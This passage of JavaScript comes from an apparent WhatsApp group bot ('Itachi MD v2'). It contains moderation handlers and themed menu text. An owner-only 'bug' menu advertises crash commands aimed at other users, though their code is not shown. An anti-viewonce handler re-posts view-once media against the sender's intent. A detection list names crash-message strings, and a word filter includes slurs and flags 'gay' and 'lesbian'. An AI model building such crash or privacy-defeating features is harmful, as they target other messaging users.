    console.log('Anti-edit error:', err);
  }
});

// 3. ANTI-VIEWONCE HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antiviewonce) {
  if (m.mtype === 'viewOnceMessageV2' || m.mtype === 'viewOnceMessage') {
    try {
      const media = await downloadMediaMessage(m, 'buffer', {});
      const type = m.message.viewOnceMessage?.message?.imageMessage ? 'image' : 'video';
      
      await rich.sendMessage(m.chat, {
        [type]: media,
        caption: `👁️ *Anti-ViewOnce Activated!*\n\n👤 Sender: @${m.sender.split('@')[0]}\n\n_View-once message saved and displayed._`,
        mentions: [m.sender]
      });
      
    } catch (err) {
      console.log('Anti-viewonce error:', err);
    }
  }
}

// 4. ANTI-SPAM HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antispam && !isAdmins && !isCreator) {
  const userId = m.sender;
  const messageText = m.text;
  
  if (!global.messageCache[userId]) {
    global.messageCache[userId] = [];
  }
  
  global.messageCache[userId].push({
    text: messageText,
    time: Date.now()
  });
  
  // Remove messages older than 10 seconds
  global.messageCache[userId] = global.messageCache[userId].filter(
    msg => Date.now() - msg.time < 10000
  );
  
  // Check for identical messages
  const identicalCount = global.messageCache[userId].filter(
    msg => msg.text === messageText
  ).length;
  
  if (identicalCount >= 5) {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    
    await rich.sendMessage(m.chat, {
      text: `⚠️ *Anti-Spam Activated!*\n\n@${m.sender.split('@')[0]} stopped spamming!\n\n🚫 Identical messages detected: ${identicalCount}\n\n_Further spam will result in mute/kick._`,
      mentions: [m.sender]
    });
    
    // Initialize spam warnings
    if (!global.db.data.users[m.sender].spamWarns) {
      global.db.data.users[m.sender].spamWarns = 0;
    }
    global.db.data.users[m.sender].spamWarns++;
    
    // Kick after 3 spam warnings
    if (global.db.data.users[m.sender].spamWarns >= 3 && isBotAdmins) {
      await rich.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
      await rich.sendMessage(m.chat, {
        text: `❌ @${m.sender.split('@')[0]} has been removed for excessive spam!`,
        mentions: [m.sender]
      });
    }
    
    global.messageCache[userId] = [];
    return;
  }
}

// 5. ANTI-FLOOD HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antiflood && !isAdmins && !isCreator) {
  const userId = m.sender;
  
  if (!global.floodCache[userId]) {
    global.floodCache[userId] = [];
  }
  
  global.floodCache[userId].push(Date.now());
  
  // Remove timestamps older than 5 seconds
  global.floodCache[userId] = global.floodCache[userId].filter(
    time => Date.now() - time < 5000
  );
  
  // Check if more than 10 messages in 5 seconds
  if (global.floodCache[userId].length > 10) {
    await rich.sendMessage(m.chat, {
      text: `🌊 *Anti-Flood Activated!*\n\n@${m.sender.split('@')[0]} is sending messages too quickly!\n\n⏸️ Muted for 5 minutes.`,
      mentions: [m.sender]
    });
    
    // Mute user (you'll need to implement mute functionality)
    global.mutedUsers = global.mutedUsers || {};
    global.mutedUsers[userId] = Date.now() + (5 * 60 * 1000); // 5 minutes
    
    global.floodCache[userId] = [];
    return;
  }
}

// 6. ANTI-CALL HANDLER
rich.ev.on('call', async (callData) => {
  try {
    for (let call of callData) {
      if (call.isGroup) {
        const groupId = call.from;
        
        if (global.db.data.chats[groupId]?.anticall) {
          await rich.rejectCall(call.id, call.from);
          
          await rich.sendMessage(groupId, {
            text: `📞 *Anti-Call Activated!*\n\n@${call.from.split('@')[0]} attempted to start a group call.\n\n⚠️ Group calls are disabled in this group.`,
            mentions: [call.from]
          });
        }
      }
    }
  } catch (err) {
    console.log('Anti-call error:', err);
  }
});

// 7. ANTI-POLL HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antipoll && !isAdmins && !isCreator) {
  if (m.mtype === 'pollCreationMessage' || m.mtype === 'pollCreationMessageV2' || m.mtype === 'pollCreationMessageV3') {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    
    await rich.sendMessage(m.chat, {
      text: `📊 *Anti-Poll Activated!*\n\n@${m.sender.split('@')[0]} only admins can create polls!`,
      mentions: [m.sender]
    });
    return;
  }
}

// 8. ANTI-STICKER HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antisticker && !isAdmins && !isCreator) {
  if (m.mtype === 'stickerMessage') {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    
    await rich.sendMessage(m.chat, {
      text: `🎭 *Anti-Sticker Activated!*\n\n@${m.sender.split('@')[0]} only admins can send stickers!`,
      mentions: [m.sender]
    });
    return;
  }
}

// 9. ANTI-VIRTEX HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antivirtex && !isAdmins && !isCreator) {
  const virtexPatterns = [
    '๒๒๒๒',
    '׆׆׆׆',
    'ดุ',
    '‮',
    /[\u0E00-\u0E7F]{10,}/, // Excessive Thai characters
    /[\u0600-\u06FF]{50,}/, // Excessive Arabic characters
    /[̀-ͯ]{10,}/, // Excessive combining characters
  ];
  
  const messageText = m.text || '';
  const isVirtex = virtexPatterns.some(pattern => {
    if (typeof pattern === 'string') {
      return messageText.includes(pattern);
    } else {
      return pattern.test(messageText);
    }
  });
  
  if (isVirtex && isBotAdmins) {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    
    await rich.sendMessage(m.chat, {
      text: `💀 *Anti-Virtex Activated!*\n\n@${m.sender.split('@')[0]} sent a virus/crash message!\n\n⚠️ User has been removed for protection.`,
      mentions: [m.sender]
    });
    
    await rich.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    return;
  }
}

// 10. ANTI-FOREIGN HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antiforeign && !isAdmins && !isCreator) {
  const englishRegex = /^[a-zA-Z0-9\s.,!?'"@#$%^&*()_+\-=\[\]{};:\\|<>\/~`]+$/;
  
  if (m.text && !englishRegex.test(m.text) && m.text.length > 5) {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    
    await rich.sendMessage(m.chat, {
      text: `🌐 *Anti-Foreign Activated!*\n\n@${m.sender.split('@')[0]} please use English only in this group!`,
      mentions: [m.sender]
    });
    return;
  }
}

// 11. ANTI-TOXIC HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antitoxic && !isAdmins && !isCreator) {
  const toxicWords = [
    'fuck', 'shit', 'bitch', 'ass', 'damn', 'hell', 'bastard', 'dick', 
    'pussy', 'cunt', 'slut', 'whore', 'nigga', 'nigger', 'faggot', 'retard',
    'idiot', 'stupid', 'dumb', 'moron', 'loser', 'ugly', 'gay', 'lesbian'
    // Add more toxic words as needed
  ];
  
  const messageText = m.text?.toLowerCase() || '';
  const hasToxic = toxicWords.some(word => {
    const regex = new RegExp(`\\b${word}\\b`, 'i');
    return regex.test(messageText);
  });
  
  if (hasToxic) {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    
    await rich.sendMessage(m.chat, {
      text: `🤬 *Anti-Toxic Activated!*\n\n@${m.sender.split('@')[0]} please keep the chat respectful!\n\n⚠️ Warning issued.`,
      mentions: [m.sender]
    });
    
    // Toxic warnings
    if (!global.db.data.users[m.sender].toxicWarns) {
      global.db.data.users[m.sender].toxicWarns = 0;
    }
    global.db.data.users[m.sender].toxicWarns++;
    
    // Mute after 3 warnings
    if (global.db.data.users[m.sender].toxicWarns >= 3) {
      await rich.sendMessage(m.chat, {
        text: `⏸️ @${m.sender.split('@')[0]} has been muted for excessive toxic language!`,
        mentions: [m.sender]
      });
      
      global.mutedUsers = global.mutedUsers || {};
      global.mutedUsers[m.sender] = Date.now() + (30 * 60 * 1000); // 30 minutes
    }
    
    return;
  }
}

// 12. AUTO-READ HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.autoread) {
  await rich.readMessages([m.key]);
}

// Check if user is muted
if (global.mutedUsers && global.mutedUsers[m.sender]) {
  if (Date.now() < global.mutedUsers[m.sender]) {
    await rich.sendMessage(m.chat, {
      delete: m.key
    });
    return; // Stop processing muted user's messages
  } else {
    delete global.mutedUsers[m.sender]; // Unmute after time expires
  }
}

switch(command) {

// ══════════════════════════════════════════════════════════
// 🏠 MAIN MENU
// ══════════════════════════════════════════════════════════
case 'menu':
case 'help':
case 'commands': {

await cookingAndReact(rich, m, '🐣');

const menuText = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍ ᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 sʏsᴛᴇᴍ ᴀᴄᴛɪᴠᴇ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ sʏsᴛᴇᴍ ɪɴғᴏ ◈ ━━━┓
│
│  ◉ ᴍᴏᴅᴇ     » ${rich.public ? '🌐 ᴘᴜʙʟɪᴄ' : '🔒 ᴘʀɪᴠᴀᴛᴇ'}
│  ◉ ᴀᴄᴄᴇss   » ᴏᴡɴᴇʀ ᴏɴʟʏ
│  ◉ ᴜsᴇʀ     » ${m.pushName}
│  ◉ ᴘʀᴇғɪx   » ${prefix}
│  ◉ ᴠᴇʀsɪᴏɴ » ᴠ2.0
│  ◉ ᴜᴘᴛɪᴍᴇ  » ${runtime(process.uptime())}
│
┗━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━ ◈ ᴍᴇɴᴜ ᴄᴀᴛᴇɢᴏʀɪᴇs ◈ ━━━┓
│
│  .ownermenu
│  .groupmenu
│  .downloadmenu
│  .animemenu
│  .stickermenu
│  .voicemenu
│  .gamemenu
│  .gfxmenu
│  .ephotomenu
│  .funmenu
│  .valentinemenu
│  .othersmenu
│  .bugmenu
│
┗━━━━━━━━━━━━━━━━━━━━━━┛

⟡ ᴛɪᴘ: ᴛʏᴘᴇ ᴀ ᴄᴀᴛᴇɢᴏʀʏ ᴄᴏᴍᴍᴀɴᴅ  
⟡ ᴇxᴀᴍᴘʟᴇ: .ownermenu

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2 · ʟᴜᴍᴏʀᴀ ᴄᴏʀᴇ
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

const menuPayload = {
    image: { url: MENU_IMAGE },
    caption: menuText,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: CHANNEL_JID,
            newsletterName: "🔴 ITACHI × MD v2",
            serverMessageId: -1
        }
    }
};

await sendTypingMenu(rich, m, menuPayload);

}
break;

case 'ownermenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴏᴡɴᴇʀ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs ◈ ━━━┓
│ .setpp
│ .owner
│ .ban / .unban
│ .block / .unblock
│ .addsudo / .delsudo
│ .sudolist
│ .public / .self
│ .setbotpic
│ .ping
│ .alive
│ .stats
│ .chatbot
│ .aimode
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'groupmenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ɢʀᴏᴜᴘ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ɢʀᴏᴜᴘ ᴄᴏɴᴛʀᴏʟ ◈ ━━━┓
│ .tagall
│ .hidetag
│ .kick
│ .promote
│ .demote
│ .mute / .unmute
│ .antilink
│ .link
│ .welcome
│ .kickall
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'stickermenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 sᴛɪᴄᴋᴇʀ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴇxᴘʀᴇssɪᴏɴ ◈ ━━━┓
│ .sticker
│ .hug
│ .kiss
│ .slap
│ .cry
│ .dance
│ .cuddle
│ .bonk
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'animemenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴀɴɪᴍᴇ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴀɴɪᴍᴇ ᴊᴜᴛsᴜ ◈ ━━━┓
│ .waifu
│ .rwaifu
│ .animehug
│ .animekiss
│ .animekill
│ .animebite
│ .animeslap
│ .animecry
│ .animedance
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'downloadmenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴅᴏᴡɴʟᴏᴀᴅ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴍᴇᴅɪᴀ ʜᴜɴᴛ ◈ ━━━┓
│ .play
│ .play2
│ .tiktok
│ .ytsearch
│ .tomp3
│ .tomp4
│ .toimg
│ .apk
│ .qrcode
│ .shorturl
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'gamemenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ɢᴀᴍᴇ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ʙᴀᴛᴛʟᴇ ◈ ━━━┓
│ .rps
│ .dice
│ .coin
│ .tictactoe
│ .guess
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'voicemenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴠᴏɪᴄᴇ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ sᴏᴜɴᴅ ᴍᴏᴅᴇ ◈ ━━━┓
│ .bass
│ .nightcore
│ .robot
│ .slow
│ .fast
│ .reverse
│ .deep
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'ephotomenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴇᴘʜᴏᴛᴏ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴇғғᴇᴄᴛs ʟᴀʙ ◈ ━━━┓
│ .glitchtext
│ .writetext
│ .neonglitch
│ .blackpink
│ .watertext
│ .luxurygold
│ .galaxy
│ .gradient
│ .clouds
│ .papercut
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'gfxmenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ɢғx sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ʟᴏɢᴏ ᴄʀᴇᴀᴛɪᴏɴ ◈ ━━━┓
│ .gfx1
│ .gfx2
│ .gfx3
│ .gfx4
│ .gfx5
│ .gfx6
│ .gfx7
│ .gfx8
│ .gfx9
│ .gfx10
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'bugmenu':
case 'techniquesmenu': {

await cookingAndReact(rich, m, '🐣');

if (!isCreator) return reply("🚫 Access denied — Hokage only.");

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ʙᴜɢ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ꜰᴏʀʙɪᴅᴅᴇɴ ᴊᴜᴛsᴜ ◈ ━━━┓
│ .x-fc
│ .x-ios
│ .x-delay
│ .x-gc
│ .delay-gc
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ ᴜsᴇ ʀᴇsᴘᴏɴsɪʙʟʏ ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━━

「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'othersmenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴜᴛɪʟɪᴛʏ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴛᴏᴏʟs ◈ ━━━┓
│ .ai
│ .openai
│ .wiki
│ .weather
│ .dictionary
│ .qrcode
│ .readqr
│ .calc
│ .currency
│ .iplookup
│ .genpass
│ .time
│ .remind
│ .recipe
│ .horoscope
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'funmenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ғᴜɴ sʏsᴛᴇᴍ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ ᴇɴᴛᴇʀᴛᴀɪɴᴍᴇɴᴛ ◈ ━━━┓
│ .joke
│ .meme
│ .truth
│ .dare
│ .advice
│ .8ball
│ .trivia
│ .fact
│ .quote
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'protectionmenu': {

await cookingAndReact(rich, m, '🐣');

const text = `
━━━━━━━━━━━━━━━━━━━━━━━━━━
⬛-(🔴) ɪ ᴛ ᴀ ᴄ ʜ ɪ  ᴍᴅ ⬛
━━━━━━━━━━━━━━━━━━━━━━━━━━
「写輪眼」 ᴘʀᴏᴛᴇᴄᴛɪᴏɴ · ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━ ◈ sᴇᴄᴜʀɪᴛʏ ◈ ━━━┓
│ .antidelete
│ .antiedit
│ .antiviewonce
│ .antispam
│ .antilink
│ .antibot
│ .antiflood
│ .autoread
┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️ ᴘʀᴏᴛᴇᴄᴛ ʏᴏᴜʀ ᴠɪʟʟᴀɢᴇ
━━━━━━━━━━━━━━━━━━━━━━━━━━

「忍」 ɪᴛᴀᴄʜɪ ᴍᴅ ᴠ2
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

await sendTypingMenu(rich, m, {
    image: { url: MENU_IMAGE },
    caption: text
});

}
break;

case 'welcome': {
   if (!isCreator) return reply(
      `
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃                         
┃   🔴 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃   
┃                         
┗━━━━━━━━━━━━━━━━━━━━━━━┛

⚠️ This command is restricted
   to the owner only!

━━━━━━━━━━━━━━━━━━━━━━━

_"You lack hatred."_
   — Itachi Uchiha 🍃

━━━━━━━━━━━━━━━━━━━━━━━`
   );
   
   if (!m.isGroup) return reply(
      `
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃                         
┃   ⚠️ 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘       
┃                         
┗━━━━━━━━━━━━━━━━━━━━━━━┛

❌ This command only works
   in groups!

━━━━━━━━━━━━━━━━━━━━━━━`
   );

   if (args[0] === 'on') {
      setSetting(m.chat, "welcome", true);
      reply(
         `
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃                         
┃  ✅ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐄𝐍𝐀𝐁𝐋𝐄𝐃  
┃                         
┗━━━━━━━━━━━━━━━━━━━━━━━┛

🎉 Welcome messages have been
   *activated* in this group!

━━━━━━━━━━━━━━━━━━━━━━━

_"Welcome to the shinobi world."_
   — Itachi Uchiha 🍃

━━━━━━━━━━━━━━━━━━━━━━━`
      );
   } else if (args[0] === 'off') {
      setSetting(m.chat, "welcome", false);
      reply(
         `
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃                         
┃ 🚫 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃 
┃                         
┗━━━━━━━━━━━━━━━━━━━━━━━┛

❌ Welcome messages have been
   *deactivated* in this group!

━━━━━━━━━━━━━━━━━━━━━━━`
      );
   } else {
      reply(
         `
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃                         
┃  📖 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐔𝐒𝐀𝐆𝐄    
┃                         
┗━━━━━━━━━━━━━━━━━━━━━━━┛

⚡ Usage: \`${prefix}welcome on/off\`

━━━━━━━━━━━━━━━━━━━━━━━

📝 Examples:

  • \`${prefix}welcome on\`
    ➜ Enable welcome messages

  • \`${prefix}welcome off\`
    ➜ Disable welcome messages

━━━━━━━━━━━━━━━━━━━━━━━`
      );
   }
}
break;
// 🔹 Auto Bio
case "autobio": {
    if (!isCreator) return m.reply(
        `┏━━━━━━━━━━━━━━━━━━┓
┃  🔴 ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ
┗━━━━━━━━━━━━━━━━━━┛

⚠️ ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴛᴏɢɢʟᴇ ᴀᴜᴛᴏ ʙɪᴏ!

_"Know your place."_ - Madara 🍃`
    );
    
    if (!args[0]) return m.reply(
        `┏━━━━━━━━━━━━━━━━━━┓
┃  📖 ᴀᴜᴛᴏʙɪᴏ ᴜsᴀɢᴇ
┗━━━━━━━━━━━━━━━━━━┛

⚡ ᴜsᴀɢᴇ: \`${prefix}autobio on/off\`

📝 ᴇxᴀᴍᴘʟᴇs:
  • \`${prefix}autobio on\` - ᴇɴᴀʙʟᴇ
  • \`${prefix}autobio off\` - ᴅɪsᴀʙʟᴇ`
    );
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.sender, "autobio", true);
        m.reply(
            `┏━━━━━━━━━━━━━━━━━━┓
┃  ✅ ᴀᴜᴛᴏʙɪᴏ ᴇɴᴀʙʟᴇᴅ
┗━━━━━━━━━━━━━━━━━━┛

📝 ᴀᴜᴛᴏ ʙɪᴏ ʜᴀs ʙᴇᴇɴ *ᴀᴄᴛɪᴠᴀᴛᴇᴅ*!
⚡ ʏᴏᴜʀ sᴛᴀᴛᴜs ᴡɪʟʟ ᴜᴘᴅᴀᴛᴇ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ.

_"The Sharingan is always watching."_ 🔴`
        );
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.sender, "autobio", false);
        m.reply(
            `┏━━━━━━━━━━━━━━━━━━┓
┃  🚫 ᴀᴜᴛᴏʙɪᴏ ᴅɪsᴀʙʟᴇᴅ
┗━━━━━━━━━━━━━━━━━━┛

🛑 ᴀᴜᴛᴏ ʙɪᴏ ʜᴀs ʙᴇᴇɴ *ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ*!
📴 ʏᴏᴜʀ sᴛᴀᴛᴜs ᴡɪʟʟ ɴᴏ ʟᴏɴɢᴇʀ ᴜᴘᴅᴀᴛᴇ.`
        );
    } else {
        m.reply(
            `┏━━━━━━━━━━━━━━━━━━┓
┃  ⚠️ ɪɴᴠᴀʟɪᴅ ᴏᴘᴛɪᴏɴ
┗━━━━━━━━━━━━━━━━━━┛

❌ ᴘʟᴇᴀsᴇ ᴜsᴇ: \`${prefix}autobio on/off\``
        );
    }
}
break;

// 🔹 Auto Read
case "autoread": {
    if (!isCreator) {
        return m.reply("🚫 *Only the creator can manipulate this jutsu.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `⚡ *Sharingan Protocol*\n\n` +
            `*Usage:* ${prefix}autoread on/off\n\n` +
            `_"Those who cannot acknowledge themselves, will eventually fail."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.sender, "autoread", true);
        m.reply(
            `🔴 *Sharingan Activated*\n\n` +
            `✅ Auto-Read has been enabled\n\n` +
            `_"I'll see through every message..."_`
        );
    } else if (action === "off") {
        setSetting(m.sender, "autoread", false);
        m.reply(
            `⚫ *Sharingan Deactivated*\n\n` +
            `❌ Auto-Read has been disabled\n\n` +
            `_"Sometimes ignorance is bliss."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}autoread on/off\n\n` +
            `_"Know the difference between on and off, or perish."_`
        );
    }
}
break;

// 🔹 Auto View Status
case "autoviewstatus": {
    if (!isCreator) {
